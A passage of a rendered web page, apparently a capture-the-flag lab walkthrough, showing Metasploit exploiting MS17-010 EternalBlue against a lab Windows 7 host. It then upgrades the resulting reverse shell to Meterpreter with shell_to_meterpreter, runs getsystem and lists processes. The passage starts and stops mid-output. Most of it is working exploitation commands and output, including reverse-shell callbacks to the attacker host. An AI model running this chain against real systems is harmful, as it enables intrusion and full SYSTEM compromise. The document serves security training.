+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - CORE raw buffer dump <span style="color:#f92672">(</span><span style="color:#ae81ff">42</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - 0x00000000  <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">69</span> 6e <span style="color:#ae81ff">64</span> 6f <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">72</span> 6f <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">73</span>  Windows <span style="color:#ae81ff">7</span> Profes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - 0x00000010  <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">69</span> 6f 6e <span style="color:#ae81ff">61</span> 6c <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">76</span>  sional <span style="color:#ae81ff">7601</span> Serv
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - 0x00000020  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">63</span> 6b <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">31</span>                    ice Pack <span style="color:#ae81ff">1</span>      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Target arch selected valid <span style="color:#66d9ef">for</span> arch indicated by DCE/RPC reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Trying exploit with <span style="color:#ae81ff">12</span> Groom Allocations.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending all but last fragment of exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Starting non-paged pool grooming
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending SMBv2 buffers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending final SMBv2 buffers.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending last fragment of exploit packet!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Receiving response from exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - ETERNALBLUE overwrite completed successfully <span style="color:#f92672">(</span>0xC000000D<span style="color:#f92672">)</span>!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending egg to corrupted connection.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Triggering free of corrupted buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.8.11.158:4444 -&gt; 10.10.223.243:49187<span style="color:#f92672">)</span> at 2020-03-20 11:49:18 +0100
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-WIN-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;</span></span></code></pre></div></div>
+</div>
+
+<p>Okey, we&rsquo;re in, so let&rsquo;s background the process and migrate shell to meterpreter</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465686621000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465686621000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465686621000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;^Z
+</span></span><span style="display:flex;"><span>Background session 1? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>  y
+</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; use post/multi/manage/shell_to_meterpreter</span></span></code></pre></div></div>
+</div>
+
+<p><strong>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</strong></p>
+<ul>
+<li>post/multi/manage/shell_to_meterpreter</li>
+</ul>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465686786000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465686786000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465686786000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>post/multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+</span></span><span style="display:flex;"><span>   LHOST                     no        IP of host that will receive the connection from the payload <span style="color:#f92672">(</span>Will try to auto detect<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>   LPORT    <span style="color:#ae81ff">4433</span>             yes       Port <span style="color:#66d9ef">for</span> payload to connect to.
+</span></span><span style="display:flex;"><span>   SESSION                   yes       The session to run this module on.</span></span></code></pre></div></div>
+</div>
+
+<p><strong>Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)</strong></p>
+<ul>
+<li>SESSION</li>
+</ul>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465687334000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465687334000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465687334000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; show sessions 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type               Information                                                                       Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----               -----------                                                                       ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         shell x64/windows  Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span> Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation...  10.8.11.158:4444 -&gt; 10.10.223.243:49187 <span style="color:#f92672">(</span>10.10.223.243<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Upgrading session ID: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting exploit/multi/handler
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.8.11.158:4433 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
+</span></span><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">180291</span> bytes<span style="color:#f92672">)</span> to 10.10.223.243
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.8.11.158:4433 -&gt; 10.10.223.243:49197<span style="color:#f92672">)</span> at 2020-03-20 11:57:43 +0100
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopping exploit/multi/handler
+</span></span><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; show sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information                                                                       Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------                                                                       ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         shell x64/windows        Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span> Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation...  10.8.11.158:4444 -&gt; 10.10.223.243:49187 <span style="color:#f92672">(</span>10.10.223.243<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span>         meterpreter x86/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ JON-PC                                                      10.8.11.158:4433 -&gt; 10.10.223.243:49197 <span style="color:#f92672">(</span>10.10.223.243<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+</div>
+
+<p>Migrating shell to meterpreter was successful, so we have 2 sessions now. Let&rsquo;s run the second one, the meterpreter session
+and migrate process to another process id.</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465688446000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465688446000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465688446000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">2</span>                                                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...                                                                                                                            
+</span></span><span style="display:flex;"><span>                                                                                                                                                              
+</span></span><span style="display:flex;"><span>meterpreter &gt; getsystem                                                                                                                                       
+</span></span><span style="display:flex;"><span>...got system via technique <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Named Pipe Impersonation <span style="color:#f92672">(</span>In Memory/Admin<span style="color:#f92672">))</span>.
+</span></span><span style="display:flex;"><span>meterpreter &gt; ps                                                                                                                                              
+</span></span><span style="display:flex;"><span>                                                                                                                                                              
+</span></span><span style="display:flex;"><span>Process List                                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span>                                                                                                                                                  
+</span></span><span style="display:flex;"><span>                                                                                                                                                              
+</span></span><span style="display:flex;"><span> PID   PPID  Name                  Arch  Session  User                          Path                                                                          
+</span></span><span style="display:flex;"><span> ---   ----  ----                  ----  -------  ----                          ----                                                                          
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>                                                                                                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System                x64   <span style="color:#ae81ff">0</span>                                                                                                                    
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">416</span>   <span style="color:#ae81ff">4</span>     smss.exe              x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe                                                  
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">428</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe                                               
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">560</span>   <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe                                               
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">564</span>   <span style="color:#ae81ff">556</span>   csrss.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">612</span>   <span style="color:#ae81ff">556</span>   wininit.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe                                               
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">624</span>   <span style="color:#ae81ff">604</span>   csrss.exe             x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">664</span>   <span style="color:#ae81ff">604</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe                                              
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">712</span>   <span style="color:#ae81ff">612</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe                                              
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">720</span>   <span style="color:#ae81ff">612</span>   lsass.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sass.exe                                                 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">724</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe                                               
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">728</span>   <span style="color:#ae81ff">612</span>   lsm.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sm.exe                                                   
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">836</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe                                               
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">904</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">952</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1020</span>  <span style="color:#ae81ff">664</span>   LogonUI.exe           x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\L</span>ogonUI.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1128</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1184</span>  <span style="color:#ae81ff">1348</span>  cmd.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>md.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1204</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1348</span>  <span style="color:#ae81ff">712</span>   spoolsv.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>poolsv.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1384</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1448</span>  <span style="color:#ae81ff">712</span>   amazon-ssm-agent.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\S</span>SM<span style="color:#ae81ff">\a</span>mazon-ssm-agent.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1524</span>  <span style="color:#ae81ff">712</span>   LiteAgent.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\X</span>entools<span style="color:#ae81ff">\L</span>iteAgent.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1664</span>  <span style="color:#ae81ff">712</span>   Ec2Config.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\E</span>c2ConfigService<span style="color:#ae81ff">\E</span>c2Config.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1996</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2084</span>  <span style="color:#ae81ff">712</span>   sppsvc.exe            x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ppsvc.exe
